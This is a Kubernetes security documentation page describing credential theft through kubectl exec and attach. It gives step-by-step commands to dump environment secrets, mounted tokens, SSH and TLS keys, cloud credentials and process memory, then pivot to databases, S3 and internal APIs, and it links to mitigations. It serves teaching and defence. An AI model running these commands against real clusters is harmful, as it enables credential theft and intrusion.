---
sidebar_position: 20
title: "Exec/Attach Credential Theft"
description: "Attack scenario demonstrating how kubectl exec and attach commands can be abused to steal credentials and sensitive data from running containers."
keywords:
  [
    kubernetes security,
    kubectl exec,
    kubectl attach,
    credential theft,
    container access,
    RBAC permissions,
    credential extraction,
    environment variables,
    secrets theft,
    lateral movement,
  ]
tags: [attack-vector, exec, rbac, secrets, CKS]
related:
  - /docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/exec_attach_security/
  - /docs/attack_vectors/insecure_rbac_permissions/
  - /docs/attack_vectors/insecure_secrets_management/
  - /docs/fundamentals/authorization/rbac/
---

# Exec/Attach Credential Theft

The Kubernetes **exec** and **attach** subresources allow users to execute commands inside running containers or attach to their processes. While essential for debugging and operations, these capabilities can be exploited by attackers with RBAC permissions to steal credentials, extract secrets, and pivot to other systems.

This attack demonstrates how compromised user accounts or service accounts with `pods/exec` or `pods/attach` permissions can access sensitive data from any pod in authorized namespaces.

---

## Exploitation Steps

Attackers with exec/attach permissions can interact with running containers to extract credentials and sensitive information.

### 1. Enumerate Accessible Pods

Discover which pods the compromised account can access.

```bash
# List all pods in accessible namespaces
kubectl get pods -A

# Check exec permissions
kubectl auth can-i create pods/exec -n production
kubectl auth can-i create pods/attach -n production

# Find pods running in production
kubectl get pods -n production -o wide
```

### 2. Extract Environment Variables with Secrets

Environment variables often contain database passwords, API keys, and access tokens.

```bash
# Execute command to dump environment variables
kubectl exec -n production webapp-pod-abc123 -- env

# Filter for sensitive patterns
kubectl exec -n production webapp-pod-abc123 -- env | grep -E '(PASSWORD|SECRET|TOKEN|KEY|CREDENTIAL)'
```

**Output:**

```bash
DATABASE_PASSWORD=P@ssw0rd123!
API_KEY=sk-1234567890abcdef
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
REDIS_PASSWORD=SuperSecret456
STRIPE_API_KEY=sk_live_51abcdefghijk
```

### 3. Access Mounted Secrets from Filesystem

Secrets mounted as volumes can be read directly from the container filesystem.

```bash
# List mounted secrets
kubectl exec -n production webapp-pod-abc123 -- ls -la /var/run/secrets

# Read database credentials
kubectl exec -n production webapp-pod-abc123 -- cat /var/run/secrets/database/username
kubectl exec -n production webapp-pod-abc123 -- cat /var/run/secrets/database/password

# Read service account token
kubectl exec -n production webapp-pod-abc123 -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 4. Extract Application Configuration Files

Applications often store credentials in configuration files.

```bash
# Read application config
kubectl exec -n production webapp-pod-abc123 -- cat /app/config/database.yml

# Search for credential files
kubectl exec -n production webapp-pod-abc123 -- find / -name "*.conf" -o -name "*.yml" -o -name "*.env" 2>/dev/null

# Read specific config
kubectl exec -n production webapp-pod-abc123 -- cat /etc/app/credentials.conf
```

**Example config exposure:**

```yaml
database:
  host: postgres.production.svc.cluster.local
  port: 5432
  username: admin
  password: ProductionDB2024!

redis:
  host: redis-master.production.svc
  password: RedisPass789

aws:
  access_key_id: AKIAIOSFODNN7EXAMPLE
  secret_access_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

### 5. Steal SSH Keys and Certificates

SSH keys and TLS certificates may be present in containers for external system access.

```bash
# Look for SSH keys
kubectl exec -n production webapp-pod-abc123 -- find /root -name "id_rsa" -o -name "id_ed25519"
kubectl exec -n production webapp-pod-abc123 -- cat /root/.ssh/id_rsa

# Find TLS certificates
kubectl exec -n production webapp-pod-abc123 -- find / -name "*.key" -o -name "*.pem" 2>/dev/null

# Extract certificate
kubectl exec -n production webapp-pod-abc123 -- cat /app/certs/server.key
```

### 6. Dump Process Memory for Credentials

Running processes may hold credentials in memory.

```bash
# Get process list
kubectl exec -n production webapp-pod-abc123 -- ps aux

# Dump process memory (requires gdb or similar tools)
kubectl exec -n production webapp-pod-abc123 -- gdb -p 1 -batch -ex 'generate-core-file /tmp/core.1'

# Extract from core dump
kubectl exec -n production webapp-pod-abc123 -- strings /tmp/core.1 | grep -E '(password|secret|token)'
```

### 7. Access Container Shell for Interactive Reconnaissance

Gain full shell access to explore the container environment.

```bash
# Get interactive shell
kubectl exec -it -n production webapp-pod-abc123 -- /bin/bash

# Inside the container:
# Check bash history for previous commands
cat ~/.bash_history

# Check for credential stores
cat ~/.aws/credentials
cat ~/.kube/config
cat ~/.docker/config.json

# Check running processes and connections
netstat -tupln
ps auxww | grep -E '(mysql|postgres|redis|mongo)'
```

### 8. Pivot to Other Systems Using Stolen Credentials

Use extracted credentials to access databases, cloud services, and other infrastructure.

```bash
# Connect to database using stolen credentials
kubectl exec -n production webapp-pod-abc123 -- \
  mysql -h postgres.production.svc.cluster.local \
  -u admin -p'ProductionDB2024!' \
  -e "SELECT user, password FROM users LIMIT 10;"

# Access AWS services
kubectl exec -n production webapp-pod-abc123 -- \
  aws s3 ls --region us-west-2

# Access internal APIs
kubectl exec -n production webapp-pod-abc123 -- \
  curl -H "Authorization: Bearer sk-1234567890abcdef" \
  https://internal-api.company.com/admin/users
```

### Result

The attacker now has:

- **Database credentials** for production databases
- **API keys** for external services (Stripe, AWS, GCP, Azure)
- **Service account tokens** for Kubernetes API access
- **SSH private keys** for accessing other servers
- **TLS certificates** for man-in-the-middle attacks
- **Application secrets** including encryption keys
- **Ability to pivot** to databases, cloud services, and internal APIs
- **Persistent access** through extracted long-lived credentials

---

## Mitigation

See the mitigation strategies in:

[Securing Exec and Attach Access](/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/exec_attach_security)
